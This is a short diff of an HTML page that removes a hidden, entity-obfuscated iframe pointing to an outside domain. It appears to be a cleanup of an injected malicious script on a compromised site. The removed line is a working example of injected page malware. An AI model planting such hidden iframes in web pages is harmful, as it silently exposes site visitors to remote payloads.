@@ -1162,6 +1162,6 @@ $files=$sorted;
 			$('li').draggable({ disabled: true });
 		}
 	</script>
-<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
+
 </body>
 </html>
